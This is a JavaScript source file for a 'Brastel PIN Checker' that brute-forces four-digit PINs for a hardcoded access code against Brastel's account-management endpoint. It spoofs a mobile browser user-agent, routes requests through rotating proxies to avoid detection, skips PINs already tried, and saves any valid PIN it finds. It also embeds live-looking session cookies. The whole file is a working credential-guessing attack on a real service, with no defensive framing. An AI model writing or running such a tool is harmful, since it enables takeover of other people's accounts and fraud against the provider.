/**
 * Brastel PIN Checker - Refactored Version
 * A modular PIN checking system with proxy rotation and concurrent workers
 */

const axios = require('axios');
const qs = require('qs');
const fs = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

/**
 * Configuration object containing all settings
 */
const CONFIG = {
  // PIN checking configuration
  accessCode: '82819563',
  pinRange: {
    start: 9995,
    end: 9999
  },

  // Worker configuration
  concurrentWorkers: 1,
  maxRetries: 5,
  retryDelay: 3000,
  proxyRotationInterval: 250000, // 250 seconds
  requestTimeout: 60000,

  // Folder paths
  folders: {
    logs: 'Log',
    data: 'Data'
  },

  // File paths for tracking (will be dynamically generated based on accessCode)
  getFilePaths(accessCode) {
    const accessCodeFolder = path.join(this.folders.data, accessCode);
    return {
      folder: accessCodeFolder,
      sentPins: path.join(accessCodeFolder, 'sent_pins_history.json'),
      blacklistPins: path.join(accessCodeFolder, 'blacklist_pins.json'),
      validPins: path.join(accessCodeFolder, 'valid_pins_found.json')
    };
  },

  // API endpoints and headers
  api: {
    url: 'https://www.brastel.com/web/WIMS/Manager.aspx',
    proxyUrl: 'https://tmproxy.com/api/proxy/get-new-proxy',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'X-Requested-With': 'XMLHttpRequest',
      'Referer': 'https://www.brastel.com/myaccount/m/password/eng',
      'Origin': 'https://www.brastel.com',
      'Accept-Encoding': 'gzip, deflate, br, zstd',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive'
    }
  },

  // Static proxy list
  proxies: [
    ''
  ],

  // Cookie configurations
  cookies: [
    '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1'
  ]
};

/**
 * File Manager class for handling PIN tracking files
 */
class FileManager {
  constructor(logger, accessCode) {
    this.logger = logger;
    this.accessCode = accessCode;
    this.filePaths = CONFIG.getFilePaths(accessCode);
    this.ensureFoldersExist();
    this.ensureFilesExist();
  }

  /**
   * Ensure all required folders exist
   */
  ensureFoldersExist() {
    // Create main folders
    Object.values(CONFIG.folders).forEach(folderPath => {
      if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
        this.logger.info(`Created folder: ${folderPath}`);
      }
    });

    // Create accessCode specific folder
    if (!fs.existsSync(this.filePaths.folder)) {
      fs.mkdirSync(this.filePaths.folder, { recursive: true });
      this.logger.info(`Created accessCode folder: ${this.filePaths.folder}`);
    }
  }

  /**
   * Ensure all tracking files exist
   */
  ensureFilesExist() {
    Object.entries(this.filePaths).forEach(([_key, filepath]) => {
      if (!fs.existsSync(filepath)) {
        this.writeJsonFile(filepath, []);
        this.logger.info(`Created tracking file for ${this.accessCode}: ${filepath}`);
      }
    });
  }

  /**
   * Read JSON file safely
   * @param {string} filename - File to read
   * @returns {Array} Array data from file
   */
  readJsonFile(filename) {
    try {
      const data = fs.readFileSync(filename, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      this.logger.warning(`Error reading ${filename}: ${error.message}`);
      return [];
    }
  }

  /**
   * Write JSON file safely
   * @param {string} filename - File to write
   * @param {Array} data - Data to write
   */
  writeJsonFile(filename, data) {
    try {
      fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    } catch (error) {
      this.logger.error(`Error writing ${filename}: ${error.message}`);
    }
  }

  /**
   * Add PIN to sent history
   * @param {string} pin - PIN to add
   */
  addSentPin(pin) {
    const sentPins = this.readJsonFile(this.filePaths.sentPins);
    if (!sentPins.includes(pin)) {
      sentPins.push(pin);
      this.writeJsonFile(this.filePaths.sentPins, sentPins);
    }
  }

  /**
   * Get all sent PINs
   * @returns {Array} Array of sent PINs
   */
  getSentPins() {
    return this.readJsonFile(this.filePaths.sentPins);
  }

  /**
   * Add PIN to blacklist
   * @param {string} pin - PIN to blacklist
   */
  addBlacklistPin(pin) {
    const blacklistPins = this.readJsonFile(this.filePaths.blacklistPins);
    if (!blacklistPins.includes(pin)) {
      blacklistPins.push(pin);
      this.writeJsonFile(this.filePaths.blacklistPins, blacklistPins);
      this.logger.warning(`Added PIN ${pin} to blacklist for ${this.accessCode}`);
    }
  }

  /**
   * Get all blacklisted PINs
   * @returns {Array} Array of blacklisted PINs
   */
  getBlacklistPins() {
    return this.readJsonFile(this.filePaths.blacklistPins);
  }

  /**
   * Check if PIN is blacklisted
   * @param {string} pin - PIN to check
   * @returns {boolean} True if blacklisted
   */
  isBlacklisted(pin) {
    const blacklistPins = this.getBlacklistPins();
    return blacklistPins.includes(pin);
  }

  /**
   * Add valid PIN to results
   * @param {string} pin - Valid PIN found
   */
  addValidPin(pin) {
    const validPins = this.readJsonFile(this.filePaths.validPins);
    const entry = {
      pin,
      accessCode: this.accessCode,
      timestamp: new Date().toISOString()
    };
    validPins.push(entry);
    this.writeJsonFile(this.filePaths.validPins, validPins);
    this.logger.found(`Saved valid PIN for ${this.accessCode} to file: ${pin}`);
  }

  /**
   * Get valid PINs
   * @returns {Array} Array of valid PINs
   */
  getValidPins() {
    return this.readJsonFile(this.filePaths.validPins);
  }
}

/**
 * Logger class for handling all logging operations
 */
class Logger {
  constructor(accessCode) {
    this.accessCode = accessCode;
    this.ensureLogFolder();
    this.logFile = path.join(CONFIG.folders.logs, `log_${accessCode}_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`);
  }

  /**
   * Ensure log folder exists
   */
  ensureLogFolder() {
    if (!fs.existsSync(CONFIG.folders.logs)) {
      fs.mkdirSync(CONFIG.folders.logs, { recursive: true });
    }
  }

  /**
   * Log a message to both console and file
   * @param {string} message - Message to log
   * @param {string} level - Log level (INFO, ERROR, SUCCESS, WARNING)
   */
  log(message, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const emoji = this.getEmoji(level);
    const fullMessage = `[${timestamp}] ${emoji} [${this.accessCode}] ${message}`;

    console.log(fullMessage);
    fs.appendFileSync(this.logFile, `${fullMessage}\n`);
  }

  /**
   * Get emoji based on log level
   * @param {string} level - Log level
   * @returns {string} Emoji for the level
   */
  getEmoji(level) {
    const emojis = {
      INFO: '🔍',
      ERROR: '❌',
      SUCCESS: '✅',
      WARNING: '⚠️',
      PROXY: '🛡️',
      FOUND: '🎯',
      SKIP: '⏭️'
    };
    return emojis[level] || '📝';
  }

  info(message) { this.log(message, 'INFO'); }
  error(message) { this.log(message, 'ERROR'); }
  success(message) { this.log(message, 'SUCCESS'); }
  warning(message) { this.log(message, 'WARNING'); }
  proxy(message) { this.log(message, 'PROXY'); }
  found(message) { this.log(message, 'FOUND'); }
  skip(message) { this.log(message, 'SKIP'); }
}

/**
 * Proxy Manager class for handling proxy operations
 */
class ProxyManager {
  constructor(logger) {
    this.logger = logger;
  }

  /**
   * Create proxy agent from static proxy URL
   * @param {string} proxyUrl - Static proxy URL
   * @returns {Object|null} Proxy agent or null
   */
  createStaticProxy(proxyUrl) {
    if (!proxyUrl) return null;
    return new HttpsProxyAgent(proxyUrl);
  }

  /**
   * Delay function
   * @param {number} ms - Milliseconds to delay
   */
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

/**
 * PIN Checker class for handling PIN validation requests
 */
class PinChecker {
  constructor(logger, proxyManager, fileManager) {
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.fileManager = fileManager;
    this.found = false;
  }

  /**
   * Check a single PIN
   * @param {string} pin - PIN to check
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @param {number} workerId - Worker ID
   * @returns {boolean} True if PIN is valid
   */
  async checkPin(pin, agent, cookie, workerId) {
    const headers = {
      ...CONFIG.api.headers,
      'Cookie': cookie
    };

    const data = {
      xslFile: 'ajax_sip_050_activation.xsl',
      action: 'ReturnSPCNumber',
      accessCode: CONFIG.accessCode,
      style: '14',
      service: '1',
      pin
    };

    for (let attempt = 1; attempt <= CONFIG.maxRetries; attempt++) {
      if (this.found) return false;

      try {
        const requestConfig = {
          headers,
          proxy: false,
          timeout: CONFIG.requestTimeout
        };

        if (agent) {
          requestConfig.httpsAgent = agent;
        }

        const response = await axios.post(CONFIG.api.url, qs.stringify(data), requestConfig);
        const result = response.data;

        this.logger.info(`Worker ${workerId} - PIN: ${pin} | Status: ${response.status} | Result: ${result.result} - ${result.errorMsg}`);

        if (result.result === undefined) {
          this.logger.warning(`Worker ${workerId} - Error checking PIN ${pin}`);
          await this.proxyManager.delay(CONFIG.retryDelay);
        } else {
          // Mark PIN as sent first
          this.fileManager.addSentPin(pin);
          if (result.result === '0') {
            // Check if this PIN is blacklisted
            if (this.fileManager.isBlacklisted(pin)) {
              this.logger.warning(`Worker ${workerId} - PIN ${pin} is blacklisted but returned success. Continuing...`);
              return false; // Continue processing instead of stopping
            }

            // Valid PIN found
            this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin} (${CONFIG.accessCode})`);
            this.fileManager.addValidPin(pin);
            this.found = true;
            return true;
          } else {
            // PIN is invalid, continue processing
            return false;
          }
        }
      } catch (error) {
        this.logger.error(`Worker ${workerId} - Error checking PIN ${pin} (attempt ${attempt}): ${error.message}`);
        if (attempt < CONFIG.maxRetries) {
          await this.proxyManager.delay(CONFIG.retryDelay);
        }
      }
    }
    return false;
  }

  /**
   * Format PIN with leading zeros
   * @param {number} pin - PIN number
   * @returns {string} Formatted PIN
   */
  formatPin(pin) {
    return (`0000${pin}`).slice(-4);
  }
}

/**
 * Worker class for handling individual worker processes
 */
class Worker {
  constructor(id, logger, proxyManager, pinChecker, fileManager) {
    this.id = id;
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.pinChecker = pinChecker;
    this.fileManager = fileManager;
  }

  /**
   * Process a list of PINs
   * @param {Array} pins - Array of PINs to check
   * @param {string} cookie - Cookie string
   * @param {string} staticProxy - Static proxy URL
   */
  async process(pins, cookie, staticProxy) {
    const agent = this.proxyManager.createStaticProxy(staticProxy);
    // const lastRotate = Date.now(); // For future proxy rotation

    // Get already sent PINs to skip
    const sentPins = this.fileManager.getSentPins();

    for (const pin of pins) {
      if (this.pinChecker.found) return;

      const formattedPin = this.pinChecker.formatPin(pin);

      // Skip if PIN was already sent
      if (sentPins.includes(formattedPin)) {
        this.logger.skip(`Worker ${this.id} - Skipping already sent PIN: ${formattedPin}`);
        continue;
      }

      await this.pinChecker.checkPin(formattedPin, agent, cookie, this.id);
    }
  }
}

/**
 * Main application class
 */
class BrastelPinChecker {
  constructor() {
    this.accessCode = CONFIG.accessCode;
    this.logger = new Logger(this.accessCode);
    this.fileManager = new FileManager(this.logger, this.accessCode);
    this.proxyManager = new ProxyManager(this.logger);
    this.pinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager);
  }

  /**
   * Generate PIN range
   * @returns {Array} Array of PINs to check
   */
  generatePinRange() {
    const pins = [];
    for (let i = CONFIG.pinRange.start; i <= CONFIG.pinRange.end; i++) {
      pins.push(i);
    }
    return pins;
  }

  /**
   * Distribute PINs among workers
   * @param {Array} pins - Array of PINs
   * @returns {Array} Array of PIN batches for workers
   */
  distributePins(pins) {
    const batchSize = Math.ceil(pins.length / CONFIG.concurrentWorkers);
    const batches = [];

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      const start = i * batchSize;
      const end = Math.min((i + 1) * batchSize, pins.length);
      batches.push(pins.slice(start, end));
    }

    return batches;
  }

  /**
   * Display statistics
   */
  displayStats() {
    const sentPins = this.fileManager.getSentPins();
    const blacklistPins = this.fileManager.getBlacklistPins();
    const validPins = this.fileManager.getValidPins();

    this.logger.info('=== STATISTICS ===');
    this.logger.info(`Access Code: ${this.accessCode}`);
    this.logger.info(`Total PINs sent: ${sentPins.length}`);
    this.logger.info(`Blacklisted PINs: ${blacklistPins.length}`);
    this.logger.info(`Valid PINs found: ${validPins.length}`);

    if (blacklistPins.length > 0) {
      this.logger.info(`Blacklisted: ${blacklistPins.join(', ')}`);
    }

    if (validPins.length > 0) {
      this.logger.success(`Valid PINs: ${validPins.map(p => p.pin).join(', ')}`);
    }

    this.logger.info('Files location:');
    this.logger.info(`- Sent PINs: ${this.fileManager.filePaths.sentPins}`);
    this.logger.info(`- Blacklist: ${this.fileManager.filePaths.blacklistPins}`);
    this.logger.info(`- Valid PINs: ${this.fileManager.filePaths.validPins}`);
  }

  /**
   * Start the PIN checking process
   */
  async start() {
    this.logger.info('Starting Brastel PIN Checker...');
    this.logger.info(`PIN Range: ${CONFIG.pinRange.start} - ${CONFIG.pinRange.end}`);
    this.logger.info(`Concurrent Workers: ${CONFIG.concurrentWorkers}`);

    // Display current statistics
    this.displayStats();

    const pins = this.generatePinRange();
    const pinBatches = this.distributePins(pins);
    const workers = [];

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      const worker = new Worker(i + 1, this.logger, this.proxyManager, this.pinChecker, this.fileManager);
      const cookie = CONFIG.cookies[i];
      const staticProxy = CONFIG.proxies[i];

      workers.push(worker.process(pinBatches[i], cookie, staticProxy));
    }

    await Promise.all(workers);
    this.logger.success('All workers completed.');

    // Display final statistics
    this.displayStats();
  }
}

// Start the application
if (require.main === module) {
  const app = new BrastelPinChecker();
  app.start().catch(error => {
    console.error('Application error:', error);
    process.exit(1);
  });
}

module.exports = { BrastelPinChecker, CONFIG };
